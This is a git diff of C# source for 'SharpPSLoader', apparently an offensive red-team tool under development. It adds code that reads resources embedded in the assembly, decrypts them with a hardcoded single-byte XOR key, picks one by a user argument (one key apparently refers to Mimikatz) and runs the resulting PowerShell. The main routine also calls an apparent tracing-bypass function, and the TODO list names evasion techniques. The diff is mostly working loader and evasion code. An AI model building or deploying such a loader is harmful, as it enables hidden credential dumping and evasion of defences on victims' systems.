@@ -11,6 +11,7 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Reflection;
 
+
 /*
  * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
  * 
@@ -25,15 +26,30 @@ using System.Reflection;
  *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
  * 
  * TODO: 
- *  1. DInvoke or peb parsing 
- *  2. Embed more powershell scripts
+ *  - Finish parsing user arguments (payload type + additional argument) 
+ *  - Finish implementing everything to installutils section 
+ *  - Embed more powershell scripts
+ *  - cleanup the code - it's a mess rn + remove readline()
+ *  
+ *  
+ *  (stretch)
+ *  - DInvoke or peb parsing 
+ *     
  * 
+ * */
+
+/*
+ * 1. parseresources --> <string, byte[]> (currently encrypted) 
+ * 2. decryptedPSFromRsrcDict --> string (decrypted) 
+ * 3. RunPowershell 
  * */
 
 namespace SharpPSLoader
 {
     public class SharpPSLoader
     {
+        public Dictionary<string, byte[]> resourceDict = ParseResources();
+
         // Decrypting with single byte, hardcoding "0x6f = (111)" as default key, for now. 
         public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
         {
@@ -48,9 +64,46 @@ namespace SharpPSLoader
             return resultStr;
         }
 
-        // Array of 
+        // Return a dictionary of <string,byte[]>
         // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
+        public static Dictionary<string, byte[]> ParseResources()
+        {
+            Dictionary<string, byte[]> resourceDict = new Dictionary<string, byte[]>();
 
+            // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
+            List<string> resourceNames = new List<string>();
+            foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
+                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
+            {
+                Console.WriteLine("{0}: {1}", property.Name, property.GetValue(null, null));
+                resourceDict[property.Name] = (byte[])(property.GetValue(null, null));
+            }
+            return resourceDict;
+        }
+
+        // public byte[] ByteArrayFromRsrcDict(dictionary<string,byte[]> resourceDict) { ~switch, return byte[] } 
+        // make resourceDict into a member variable? not sure. 
+        public string DecryptedPSFromRsrcDict(Dictionary<string,byte[]> resourceDict, string payload)
+        {
+            // 1. Return encrypted powershell payload byte array 
+            byte[] encPayload = Array.Empty<byte>();
+            switch (payload)
+            {
+                case "1":
+                    encPayload = resourceDict.Where(a => a.Key.Contains("mika")).Select(a => a.Value).First();
+                    break;
+                case "2":
+                    encPayload = resourceDict.Where(a => a.Key.Contains("oodho")).Select(a => a.Value).First();
+                    break;
+                default:
+                    break;
+            }
+
+            // 2. Decrypt the byte array, and return the raw powershell payload 
+            string decPowershell = DecryptAndStringReturn(encPayload);
+
+            return decPowershell;
+        }
 
         public static string ParseFunctionName(string payload)
         {
@@ -245,18 +298,15 @@ namespace SharpPSLoader
             psLoader.bypassTW();
             //Console.ReadLine();
 
-            // Parse argument and then change psloader.mimiStr to corresponding script 
-
-            //var thing = Properties.Resources.;
-
-            // Function that returns array of property.Name, 
-            foreach (PropertyInfo property in typeof(Properties.Resources).GetProperties
-                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic))
+            // Parse argument 
+            string powershellPayload = "";
+            if (args[0] != null)
             {
-                Console.WriteLine("{0}: {1}", property.Name, property.GetValue(null, null));
+                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, args[0]);
             }
+            
 
-            //psLoader.RunPowershell(psLoader.mimiStr, args[0]);
+            psLoader.RunPowershell(powershellPayload, args[1]);
             Console.ReadLine();
         }
 
